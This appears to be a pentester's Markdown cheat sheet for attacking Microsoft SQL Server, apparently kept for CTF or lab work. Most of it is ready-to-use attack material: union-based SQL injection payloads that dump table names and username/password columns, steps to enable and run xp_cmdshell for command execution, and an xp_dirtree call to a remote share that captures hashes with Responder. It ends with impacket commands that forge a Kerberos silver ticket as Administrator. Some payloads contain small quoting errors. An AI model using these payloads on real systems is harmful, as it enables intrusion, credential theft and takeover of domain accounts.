# MSSQL
## CLI
Get databases:
```
select name from sys.databases;
```
Get tables from the given database:
```
select TABLE_NAME from <DB-name>.INFORMATION_SCHEMA.TABLES;
```
Dump data from the table
```
select * from <db-name>..<table-name>;
```
```
select * from <db-name>.dbo.<table-name>;
```

## Injection
Get tables:
```
1' union select 1,name,id,4,5,6 from <dbname>..sysobjects where xtype=u-- -
```
Concat different things into one:
```
1' union select 1,concat(name,':',id),id,4,5,6 from <dbname>..sysobjects where xtype=u-- -
```
Instead of `GROUP_CONCAT` we use `string_agg`:
```
1' union select 1,(select string_agg(concat(name,':',id),|')),id,4,5,6 from <dbname>..sysobjects where xtype=u-- -
```
Getting columns:
```
1' union select 1,(select string_agg(name,'|')),id,4,5,6 from <tablename>..syscolumns where id=<table-id-that-we-get-above>-- -
```
Dump data:
```
1' union select 1,(select string_agg(concat(username,'/',password),|') from <db-name>..<table-name>),3,4,5,6-- -
```

Some useful variables:
```
@@version

# Current user
user

# Current DB
db_name()

# You can increase number
db_name(0)
db_name(1)
```

# Command Injection
## `xp_cmdshell`
If it is disabled: https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
EXEC xp_cmdshell 'whoami';
```

## Stacked Queries
Use it with responder. If it is system account you f*cked up! :D
```
500'; EXEC xp_dirtree '\\10.10.10.10\sharename\file';-- -
```



# `sqsh`

# Command Injection
```
xp_cmdshell "whoami"
go
```
If it doesn't work
```
enable xp_cmdshell
```

## Authenticate with Kerberos
- (Include Kerberos TGT - it is explained in `Active Directory.md`)
- Create TGT
```
impacket-gettgt domain.local/username:password
```
- Export TGT
```
export KRB5CCNAME=outputfilename.cache
```
- Verify it
```
klist
```
- Login MS SQL service
```
impacket-mssqlclient dc01.domain.local -k
```

## Creating Silver Ticket for Authentication
- Get user SID for gaining Domain SID
- You can get it via ldap (check ippsec Scrambled 21:00)
```
impacket-getpac adminsitrator domain.local/username:password
```
- Create ticket
```
impacket-ticketer -spn MSSQLSvc/dc1.scrm.local -user-id 500 Administrator -nthash <lowercase-ntlm-hash> -domain-sid <S-1-5-...> -domain scrm.local
```
- `500`: Administrator ID


- Add ticket
```
export KRB5CCNAME=Administrator.ccache
```
- Verify
```
klist
```
